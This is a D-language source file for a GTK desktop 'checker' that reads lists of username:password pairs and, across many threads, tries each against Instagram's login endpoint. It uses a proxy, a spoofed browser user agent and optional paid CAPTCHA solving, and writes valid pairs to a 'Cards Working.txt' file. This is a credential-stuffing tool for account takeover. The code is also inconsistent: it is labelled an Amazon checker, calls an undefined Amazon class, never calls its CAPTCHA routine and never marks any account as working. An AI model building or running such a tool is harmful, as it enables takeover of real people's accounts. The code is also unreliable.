module main;

import std.stdio;
import core.stdc.string;
import std.string;
import std.net.curl;
import std.parallelism;
import std.random;
import std.regex;
import std.file;
import core.time;
import etc.c.curl : CurlOption, CurlInfo;
import gtk.Button;
import gtk.Entry;
import gtk.FileChooserDialog;
import gtk.Label;
import gtk.Main;
import gtk.MainWindow;
import gtk.SpinButton;
import gtk.VBox;
import std.array;
import std.conv;

string runCaptcha(string img, string duser, string dpass)
{
	writeln("Running Captcha Check!");
	string text;
	string bound = "---------------------------723690991551375881941829999";
	auto conn = HTTP("http://api.dbcapi.me/api/captcha");
	conn.handle.set(CurlOption.followlocation, false);
	conn.handle.set(CurlOption.ssl_verifypeer, false);
	conn.addRequestHeader("Content-Type", "multipart/form-data; boundary=" ~ bound ~ "; charset=UTF-8");
	conn.addRequestHeader("Accept", "application/json; charset=utf-8");
	string postData = "--" ~ bound ~ "\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n" ~ to!string(duser) ~ "\r\n--" ~ bound ~ "\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n" ~ to!string(dpass) ~ "\r\n--" ~ bound ~ "\r\nContent-Disposition: form-data; name=\"captchafile\"; filename=\"captchafile\";\r\nContent-Type: application/octet-stream\r\n\r\n" ~ to!string(img) ~ "\r\n--" ~ bound ~ "--\r\n";
	conn.postData = postData;
	conn.perform();
	string url = conn.responseHeaders["location"];
	bool solved = false;
	while(!solved)
	{
		ubyte[] result;
		auto conn1 = HTTP(url);
		conn1.handle.set(CurlOption.ssl_verifypeer, false);
		conn1.addRequestHeader("Accept", "application/json; charset=utf-8");
		conn1.onReceive = (ubyte[] data)
		{
			result ~= data;
			return data.length;
		};
		conn1.perform();
		char* cstr = cast(char*) result;
		string str = cast(string) cstr[0..strlen(cstr)];
		
		auto js = parseJSON(str);
		if (!chomp(js["text"].str).empty)
		{
			text = js["text"].str;
			writeln("Found Captcha Text: " ~ text);
			solved = true;
		}
		else
		{
			core.thread.Thread.sleep(dur!("seconds")(1));
		}
	}
	return text;
}

void run(string user, string pass, string duser, string dpass)
{
	while (true) {
		try
		{
			writeln("Begin Checking Account! " ~ user);
			bool working = false;
			string captchatext;
			auto conn = HTTP();
			conn.handle.set(CurlOption.ssl_verifypeer, false);
			conn.handle.set(CurlOption.proxy, "127.0.0.1:8888");
			conn.operationTimeout(dur!"seconds"(10));
			
			auto rand = uniform(99999999999999, 99999999999999999);
			conn.setCookieJar(tempDir() ~ to!string(rand));
			conn.addRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.0 Safari/537.36");
			auto html = get("https://instagram.com/accounts/login/", conn);
			string postData = "username=" ~ user ~ "&password=" ~ pass ~ "&intent==";
			html = post("https://instagram.com/accounts/login/ajax/", postData.replace(":", "%3A"), conn);
			auto js = parseJSON(html);
			if (js["authenticated"])
			{

			}
			else
			{
				writeln("Account Does Not Work! " ~ user);
				return;
			}
			
			if (working)
			{
				std.file.append("./Cards Working.txt", user ~ ":" ~ pass ~ "\r\n");
				delete html;
				conn.clearAllCookies();
				return;
			}
		} catch (Exception e) {
			writeln(e.msg);
			core.thread.Thread.sleep(dur!("seconds")(1));
		}
	}
}

void startRun(string file, int threads, string duser = null, string dpass = null)
{
	auto accounts = readText(file).splitLines();
	auto work = new TaskPool(threads);
	foreach (account; work.parallel(accounts))
	{
		if(account.indexOf(":") != -1 && account.indexOf("@") != -1)
		{
			auto arr = split(account, ":");
			run(to!string(chomp(arr[0])), to!string(chomp(arr[1])), duser, dpass);
		}
	}
}

class Instagram : MainWindow
{
	Label StatusLbl;
	string combofile;
	string proxyfile;
	SpinButton spinb;
	Entry user;
	Entry pass;
	this()
	{
		super("Fur's Amazon Checker");
		setDefaultSize(250, 250);
		VBox box = new VBox(false, 2);
		box.add(new Button("Load Combos", &loadCombos));
		box.add(new Button("Load Proxies", &loadProxy));
		box.add(new Label("Threads"));
		spinb = new SpinButton(1, 250, 1);
		box.add(spinb);
		box.add(new Label("DBC User (If using DBC)"));
		user = new Entry();
		box.add(user);
		box.add(new Label("DBC Password (If using DBC)"));
		pass = new Entry();
		box.add(pass);
		box.add(new Button("Start", &start));
		add(box);
		showAll();	
	}
	
	void loadCombos(Button button)
	{
		auto dlg = new FileChooserDialog(
			"Open File",
			this,
			FileChooserAction.OPEN,
			["Open", "Cancel"],
			[ResponseType.ACCEPT, ResponseType.CANCEL]
			);
		if (GtkResponseType.ACCEPT == dlg.run()){
			combofile = dlg.getFilename();
		}
		dlg.destroy();
	}

	void loadProxy(Button button)
	{
		auto dlg = new FileChooserDialog(
			"Open File",
			this,
			FileChooserAction.OPEN,
			["Open", "Cancel"],
			[ResponseType.ACCEPT, ResponseType.CANCEL]
			);
		if (GtkResponseType.ACCEPT == dlg.run()){
			proxyfile = dlg.getFilename();
		}
		dlg.destroy();
	}

	void start(Button button)
	{
		if (user.getText().empty) {
			startRun(combofile, to!int(spinb.getText));
		} else {
			startRun(combofile, to!int(spinb.getText), user.getText(), pass.getText());
		}
		writeln("Done Checking!");
	}
}

void main(string[] args)
{
	Main.init(args);
	auto mwin = new Amazon();
	Main.run();
}